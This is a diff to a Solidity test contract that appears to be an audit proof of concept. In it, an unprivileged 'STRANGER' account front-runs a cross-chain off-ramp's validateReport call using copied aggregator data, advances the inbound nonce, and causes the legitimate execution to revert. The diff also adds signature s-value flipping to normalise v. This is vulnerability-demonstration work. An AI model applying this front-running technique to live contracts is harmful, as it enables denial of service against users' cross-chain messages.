@@ -112,10 +112,16 @@ contract CommitOffRamp_ValidateReport_POC is BaseTest {
     bytes32[] memory rs = new bytes32[](s_signerKeys.length);
     bytes32[] memory ss = new bytes32[](s_signerKeys.length);
     address[] memory signersRecovered = new address[](s_signerKeys.length);
+    // secp256k1 curve order
+    uint256 SECP256K1_N =
+      0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
     for (uint256 i = 0; i < s_signerKeys.length; ++i) {
       (uint8 v, bytes32 r, bytes32 s) = vm.sign(s_signerKeys[i], reportHash);
-      // v is ignored by on-chain validation; always treated as 27
-      v; // silence linter
+      // Normalize signature to v=27 by flipping s when v==28
+      if (v == 28) {
+        // s' = n - s
+        s = bytes32(SECP256K1_N - uint256(s));
+      }
       rs[i] = r;
       ss[i] = s;
       signersRecovered[i] = vm.addr(s_signerKeys[i]);
@@ -162,13 +168,16 @@ contract CommitOffRamp_ValidateReport_POC is BaseTest {
     bytes memory ccvData = _buildCCVData(messageHash, 1);
 
     // Attacker front-runs using the exact CCV data from the aggregator tx
-    vm.prank(STRANGER);
+    vm.stopPrank();
+    vm.startPrank(STRANGER);
     s_commit.validateReport({
       message: message,
       messageHash: messageHash,
       ccvData: ccvData,
       originalState: Internal.MessageExecutionState.UNTOUCHED
     });
+    vm.stopPrank();
+    vm.startPrank(OWNER);
 
     // Inbound nonce should now be incremented to 1 for (SOURCE_CHAIN_SELECTOR, OWNER)
     assertEq(s_nonceManager.getInboundNonce(SOURCE_CHAIN_SELECTOR, abi.encode(OWNER)), 1);
@@ -198,13 +207,16 @@ contract CommitOffRamp_ValidateReport_POC is BaseTest {
     s_agg.execute(report);
 
     // Attacker can still call validateReport and advance inbound nonce to 1
-    vm.prank(STRANGER);
+    vm.stopPrank();
+    vm.startPrank(STRANGER);
     s_commit.validateReport({
       message: message,
       messageHash: messageHash,
       ccvData: ccvData,
       originalState: Internal.MessageExecutionState.UNTOUCHED
     });
+    vm.stopPrank();
+    vm.startPrank(OWNER);
     assertEq(s_nonceManager.getInboundNonce(SOURCE_CHAIN_SELECTOR, abi.encode(OWNER)), 1);
 
     // After curse is lifted, aggregator now reverts due to nonce mismatch (InvalidNonce bubbled up)
